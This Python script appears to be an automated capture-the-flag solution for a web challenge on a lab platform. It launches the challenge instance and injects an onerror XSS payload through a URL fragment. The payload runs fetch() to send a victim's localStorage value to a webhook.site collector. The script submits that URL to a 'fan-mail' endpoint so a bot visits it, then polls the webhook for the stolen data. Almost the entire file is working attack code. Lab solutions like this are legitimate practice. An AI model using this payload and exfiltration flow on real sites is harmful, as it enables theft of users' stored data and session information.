import sys, json, re, time, requests, urllib3, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab
urllib3.disable_warnings()
UUID = "3a136222-2f46-4372-9236-90095ca2eb4d"

cy = CyLab(delay=0.6)
cy.login()
cy.req("PUT", "/api/challenges/277/instance/?source=library")
site = None
for _ in range(12):
    time.sleep(1)
    st, b = cy.req("GET", "/api/challenges/277/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"(http://[A-Za-z0-9.\-]+:\d+/)", d.get("description") or "")
    if m:
        site = m.group(1)
        break
print("site:", site)
if not site:
    sys.exit(1)
js = "fetch('https://webhook.site/%s/?f='+encodeURIComponent(localStorage.username))" % UUID
target = "http://localhost:4000/drawing/1#" + urllib.parse.urlencode({"src": "invalid", "onerror": js})
print("payload len:", len(target))
for attempt in range(6):
    try:
        r = requests.post(site.rstrip("/") + "/fan-mail", json={"url": target}, timeout=30)
        print("fan-mail ->", r.status_code, r.text[:120])
        if r.status_code == 200:
            break
    except Exception as e:
        print("essai", attempt + 1, type(e).__name__)
    time.sleep(2)
print("\n=== attente du webhook ===")
for i in range(20):
    time.sleep(4)
    try:
        rr = requests.get("https://webhook.site/token/%s/requests" % UUID, timeout=20)
        d = rr.json()
        data = d.get("data") or []
        if data:
            for req in data:
                print("REQUETE:", req.get("method"), req.get("url", "")[:300])
                print("  query:", req.get("query"))
            break
        elif i % 5 == 0:
            print("  ... aucune requete (%ds)" % ((i + 1) * 4))
    except Exception as e:
        print("poll err", type(e).__name__)
